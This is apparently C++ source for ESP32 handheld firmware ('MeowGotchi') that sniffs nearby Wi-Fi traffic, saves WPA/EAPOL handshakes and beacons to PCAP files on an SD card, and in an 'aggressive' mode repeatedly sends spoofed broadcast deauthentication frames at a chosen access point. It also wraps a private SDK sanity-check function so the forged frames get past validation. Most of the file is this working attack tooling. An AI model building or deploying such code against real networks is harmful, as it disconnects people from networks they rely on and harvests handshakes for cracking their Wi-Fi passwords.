// MeowGotchi engine inspired by FeralDevs/FeralCat (see README in this folder).
#include "wifi_hunter.h"
#include "wifi_frame.h"
#include "pcap.h"
#include "raw_tx_guard.h"
#include "../../ui/ui_wifi_bridge.h"
#include <esp_timer.h>
#include <esp_idf_version.h>

// The reference firmware replaces this private SDK symbol unconditionally.
// This pinned version admits only our exact selected-AP frame, synchronously
// submitted by the app task. No other caller gets a validation bypass.
#if ESP_IDF_VERSION != ESP_IDF_VERSION_VAL(4,4,3)
#error Review MeowGotchi raw TX ABI before changing ESP-IDF versions
#endif
namespace {
TaskHandle_t volatile txTask = nullptr;
const uint8_t* volatile txFrame = nullptr;
uint8_t txTarget[6]{};
}
extern "C" int ieee80211_raw_frame_sanity_check(int32_t interface, const uint8_t* frame,
                                                      int32_t length, bool systemSequence);
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t interface, const uint8_t* frame,
                                                      int32_t length, bool systemSequence) {
    if (interface == WIFI_IF_STA && frame == txFrame && txTask == xTaskGetCurrentTaskHandle() &&
        meowgotchi::deauthFrame(frame, length, txTarget)) return 0;
    return ieee80211_raw_frame_sanity_check(interface,frame,length,systemSequence);
}

namespace meowgotchi {
namespace {
constexpr unsigned MaxAP=96, MaxStation=128, QueueLength=16;
struct CaptureFrame {
    uint64_t micros;
    uint16_t len;
    bool key;
    uint8_t data[pcap::SnapLength];
};
portMUX_TYPE mux=portMUX_INITIALIZER_UNLOCKED;
AccessPoint aps[MaxAP];
uint8_t stations[MaxStation][6];
bool advertised[MaxAP];
HunterStats live;
PairTracker pairs;
QueueHandle_t rxQueue=nullptr;
bool accepting=false, capture=false;
CaptureFrame staging; // Wi-Fi task stack is small: never put a full frame on it.

void receive(void* buffer, wifi_promiscuous_pkt_type_t type) {
    if (!buffer || (type!=WIFI_PKT_MGMT && type!=WIFI_PKT_DATA)) return;
    const auto* packet=static_cast<const wifi_promiscuous_pkt_t*>(buffer);
    if (packet->rx_ctrl.rx_state || packet->rx_ctrl.sig_len<4) return;
    const size_t len=packet->rx_ctrl.sig_len-4; // SDK sig_len includes FCS
    const FrameInfo info=parseFrame(packet->payload,len);
    if (!info.bssid) return;
    const uint64_t at=esp_timer_get_time();
    portENTER_CRITICAL(&mux);
    if (!accepting) { portEXIT_CRITICAL(&mux); return; }
    unsigned index=0;
    while (index<live.aps && memcmp(aps[index].bssid,info.bssid,6)) ++index;
    if (index==live.aps && index<MaxAP) {
        aps[index]={}; memcpy(aps[index].bssid,info.bssid,6); ++live.aps;
    }
    if (index<MaxAP) {
        auto& ap=aps[index];
        ap.channel=packet->rx_ctrl.channel; ap.rssi=packet->rx_ctrl.rssi;
        if (info.ssid && info.ssidLength) {
            for (unsigned n=0;n<info.ssidLength;++n)
                ap.ssid[n]=(info.ssid[n]>=32 && info.ssid[n]<127)?char(info.ssid[n]):'?';
            ap.ssid[info.ssidLength]=0;
        }
    }
    if (info.station) {
        unsigned n=0;
        while (n<live.stations && memcmp(stations[n],info.station,6)) ++n;
        if (n==live.stations && n<MaxStation) memcpy(stations[live.stations++],info.station,6);
    }
    if (info.disconnect) ++live.disconnects;
    if (info.eapol) { ++live.eapol; if (pairs.observe(info)) ++live.pairs; }
    const bool beacon=info.advertisement && index<MaxAP && !advertised[index];
    if (capture && rxQueue && (info.eapol || beacon)) {
        if (len>pcap::SnapLength) ++live.dropped;
        else {
            staging.micros=at; staging.len=len; staging.key=info.eapol;
            memcpy(staging.data,packet->payload,len);
            if (xQueueSend(rxQueue,&staging,0)==pdTRUE) {
                if (beacon) advertised[index]=true;
            } else ++live.dropped;
        }
    }
    portEXIT_CRITICAL(&mux);
}
} // namespace

bool WifiHunter::fail(const char* action, esp_err_t code) {
    snprintf(_error,sizeof(_error),"%s: %s",action,esp_err_to_name(code));
    Serial.printf("[MeowGotchi] %s\n",_error);
    return false;
}
void WifiHunter::begin(bool sdReady, const char* captureDirectory) {
    stop();
    if (_ownsRadio) return; // keep a failed cleanup available for the next retry
    _sdReady=sdReady; _capture=false; _aggressive=false; _target=-1;
    _stats={}; _elapsed=0; _error[0]=_path[0]=0;
    snprintf(_captureDirectory,sizeof(_captureDirectory),"%s",captureDirectory);
    _pendingFrames=_pendingKeys=0;
    portENTER_CRITICAL(&mux);
    live={}; pairs.reset(); for (auto& ap:aps) ap={}; memset(advertised,0,sizeof(advertised));
    portEXIT_CRITICAL(&mux);
}
bool WifiHunter::resume() {
    if (_running) return true;
    if (_ownsRadio && !restoreRadio()) return false;
    _error[0]=0;
    if (ui_wifi_bridge_radio_busy() || WiFi.scanComplete()==WIFI_SCAN_RUNNING)
        return fail("Wi-Fi scan busy",ESP_ERR_INVALID_STATE);
    _savedMode=WiFi.getMode();
    if (_savedMode & WIFI_MODE_AP) return fail("Wi-Fi AP busy",ESP_ERR_INVALID_STATE);
    bool sniffing=false;
    if (esp_wifi_get_promiscuous(&sniffing)==ESP_OK && sniffing)
        return fail("Radio already in use",ESP_ERR_INVALID_STATE);
    if (!_queue) _queue=xQueueCreate(QueueLength,sizeof(CaptureFrame));
    if (!_queue) return fail("Capture memory",ESP_ERR_NO_MEM);
    _reconnect=WiFi.isConnected() || ui_wifi_bridge_get_status()==WIFI_BRIDGE_CONNECTING;
    _autoReconnect=WiFi.getAutoReconnect(); WiFi.setAutoReconnect(false);
    _haveFilter=esp_wifi_get_promiscuous_filter(&_savedFilter)==ESP_OK;
    _haveChannel=esp_wifi_get_channel(&_savedChannel,&_savedSecondary)==ESP_OK;
    esp_wifi_get_ps(&_savedPower);
    _ownsRadio=true;
    ui_wifi_bridge_disconnect();
    if (!WiFi.mode(WIFI_STA)) { restoreRadio(); return fail("Start radio",ESP_FAIL); }
    esp_err_t result=esp_wifi_set_ps(WIFI_PS_NONE);
    wifi_country_t country{};
    _first=1; _last=11;
    if (esp_wifi_get_country(&country)==ESP_OK && country.schan>=1 && country.nchan &&
        unsigned(country.schan)+country.nchan-1<=14) {
        _first=country.schan; _last=country.schan+country.nchan-1;
    }
    _stats.channel=_first; _lastHop=_lastTx=millis();
    wifi_promiscuous_filter_t filter{};
    filter.filter_mask=WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    if (result==ESP_OK) result=esp_wifi_set_promiscuous_filter(&filter);
    if (result==ESP_OK) result=esp_wifi_set_channel(_stats.channel,WIFI_SECOND_CHAN_NONE);
    if (result==ESP_OK) result=esp_wifi_set_promiscuous_rx_cb(receive);
    portENTER_CRITICAL(&mux);
    memset(advertised,0,sizeof(advertised)); // every new PCAP needs its AP advertisements
    accepting=true; rxQueue=_queue; capture=_capture;
    portEXIT_CRITICAL(&mux);
    if (result==ESP_OK) result=esp_wifi_set_promiscuous(true);
    if (result!=ESP_OK) { restoreRadio(); return fail("Start monitor",result); }
    _running=true; _runSince=millis();
    Serial.println("[MeowGotchi] started (passive)");
    return true;
}
bool WifiHunter::restoreRadio() {
    if (!_ownsRadio) return true;
    portENTER_CRITICAL(&mux); accepting=false; capture=false; rxQueue=nullptr; portEXIT_CRITICAL(&mux);
    if (_savedMode==WIFI_MODE_NULL && WiFi.getMode()==WIFI_MODE_NULL) {
        WiFi.setAutoReconnect(_autoReconnect); _ownsRadio=false; return true;
    }
    esp_err_t result=esp_wifi_set_promiscuous(false);
    if (result!=ESP_OK) return fail("Stop monitor",result);
    result=esp_wifi_set_promiscuous_rx_cb(nullptr);
    if (result!=ESP_OK) return fail("Release monitor",result);
    if (_haveFilter) {
        result=esp_wifi_set_promiscuous_filter(&_savedFilter);
        if (result!=ESP_OK) return fail("Restore Wi-Fi filter",result);
    }
    result=esp_wifi_set_ps(_savedPower);
    if (result!=ESP_OK) return fail("Restore Wi-Fi power",result);
    if (_haveChannel && _savedMode==WIFI_MODE_STA && !_reconnect) {
        result=esp_wifi_set_channel(_savedChannel,_savedSecondary);
        if (result!=ESP_OK) return fail("Restore Wi-Fi channel",result);
    }
    if (!WiFi.mode(_savedMode)) return fail("Restore Wi-Fi mode",ESP_FAIL);
    WiFi.setAutoReconnect(_autoReconnect);
    if (_reconnect && (_savedMode & WIFI_MODE_STA) && !ui_wifi_bridge_resume_station())
        return fail("Restore Wi-Fi connection",ESP_FAIL);
    _ownsRadio=false;
    return true;
}
void WifiHunter::pause() {
    if (_running) _elapsed+=millis()-_runSince;
    _running=false; _aggressive=false;
    restoreRadio(); drain(); closeCapture(); snapshot();
}
void WifiHunter::stop() {
    pause();
    if (_queue) { vQueueDelete(_queue); _queue=nullptr; }
    _capture=false;
}
uint32_t WifiHunter::uptime() const { return (_elapsed+(_running?millis()-_runSince:0))/1000; }
void WifiHunter::snapshot() {
    portENTER_CRITICAL(&mux);
    _stats.aps=live.aps; _stats.stations=live.stations; _stats.eapol=live.eapol;
    _stats.pairs=live.pairs; _stats.disconnects=live.disconnects; _stats.dropped=live.dropped;
    portEXIT_CRITICAL(&mux);
}
bool WifiHunter::accessPoint(unsigned index, AccessPoint& out) const {
    portENTER_CRITICAL(&mux);
    const bool exists=index<live.aps;
    if (exists) out=aps[index];
    portEXIT_CRITICAL(&mux);
    return exists;
}
bool WifiHunter::selectTarget(unsigned index) {
    AccessPoint ap;
    if (!accessPoint(index,ap)) return false;
    _aggressive=false; _target=index; return true;
}
bool WifiHunter::setAggressive(bool enabled) {
    if (!enabled) { _aggressive=false; return true; }
    AccessPoint ap;
    if (!_running || _target<0 || !accessPoint(_target,ap))
        return fail("Select a network first",ESP_ERR_INVALID_STATE);
    if (ap.channel<_first || ap.channel>_last) return fail("Target channel",ESP_ERR_INVALID_ARG);
    const esp_err_t result=esp_wifi_set_channel(ap.channel,WIFI_SECOND_CHAN_NONE);
    if (result!=ESP_OK) return fail("Target channel",result);
    _stats.channel=ap.channel; _lastTx=millis(); _aggressive=true; _error[0]=0;
    return true;
}
bool WifiHunter::setCapture(bool enabled) {
    if (enabled && (!_sdReady || SD_MMC.cardType()==CARD_NONE)) return fail("No SD card",ESP_ERR_NOT_FOUND);
    portENTER_CRITICAL(&mux);
    capture=enabled && _running;
    memset(advertised,0,sizeof(advertised));
    portEXIT_CRITICAL(&mux);
    _capture=enabled; _error[0]=0;
    if (!enabled) { drain(); closeCapture(); }
    return true;
}
bool WifiHunter::openCapture() {
    if (_file) return true;
    for (unsigned n=0;n<8;++n) {
        snprintf(_path,sizeof(_path),"/handshakes/meowgotchi-%08lx.pcap",(unsigned long)esp_random());
        if (!_file.open(_captureDirectory,_path+12)) {
            if (errno==EEXIST) continue;
            return false;
        }
        if (!pcap::start(_file)) { _file.close(); return false; }
        _lastFlush=millis(); return true;
    }
    return false;
}
void WifiHunter::captureFailed() {
    portENTER_CRITICAL(&mux);
    capture=false; live.dropped+=_pendingFrames;
    portEXIT_CRITICAL(&mux);
    _pendingFrames=_pendingKeys=0; _capture=false; _sdReady=false;
    CaptureFrame frame;
    while (_queue && xQueueReceive(_queue,&frame,0)==pdTRUE) {
        portENTER_CRITICAL(&mux); ++live.dropped; portEXIT_CRITICAL(&mux);
    }
    const int code=_file.errorCode();
    snprintf(_error,sizeof(_error),"SD %s: %s (%d)",_file.operation(),strerror(code),code);
    _file.close(); Serial.printf("[MeowGotchi] %s\n",_error);
}
bool WifiHunter::syncCapture() {
    if (!_file) return true;
    if (!_file.sync()) { captureFailed(); return false; }
    _stats.saved+=_pendingFrames; _stats.savedKeys+=_pendingKeys;
    _pendingFrames=_pendingKeys=0; _lastFlush=millis(); return true;
}
void WifiHunter::closeCapture() {
    if (_file && syncCapture() && !_file.close()) captureFailed();
}
void WifiHunter::drain(unsigned limit) {
    if (!_queue) return;
    CaptureFrame frame;
    while (limit-- && xQueueReceive(_queue,&frame,0)==pdTRUE) {
        ++_pendingFrames; if (frame.key) ++_pendingKeys;
        if (!openCapture() || !pcap::packet(_file,frame.data,frame.len,frame.micros)) {
            captureFailed();
            break;
        }
    }
    if (_file && millis()-_lastFlush>=1000) syncCapture();
}
void WifiHunter::sendDeauth() {
    AccessPoint ap;
    if (_target<0 || !accessPoint(_target,ap)) { _aggressive=false; return; }
    uint8_t frame[26]={0xc0,0,0,0,255,255,255,255,255,255};
    memcpy(frame+10,ap.bssid,6); memcpy(frame+16,ap.bssid,6); frame[24]=7;
    memcpy(txTarget,ap.bssid,6); txTask=xTaskGetCurrentTaskHandle(); txFrame=frame;
    const esp_err_t result=esp_wifi_80211_tx(WIFI_IF_STA,frame,sizeof(frame),false);
    txFrame=nullptr; txTask=nullptr;
    if (result==ESP_OK) ++_stats.sent;
    else { ++_stats.txErrors; _aggressive=false; fail("Deauth TX failed",result); }
}
void WifiHunter::loop() {
    if (!_running) return;
    const uint32_t now=millis();
    if (!_aggressive && now-_lastHop>=400) {
        _lastHop=now;
        const uint8_t next=_stats.channel>=_last?_first:_stats.channel+1;
        const esp_err_t result=esp_wifi_set_channel(next,WIFI_SECOND_CHAN_NONE);
        if (result!=ESP_OK) { pause(); fail("Channel hop failed",result); return; }
        _stats.channel=next;
    }
    if (_aggressive && now-_lastTx>=150) { _lastTx=now; sendDeauth(); }
    drain(4); snapshot();
}
} // namespace meowgotchi
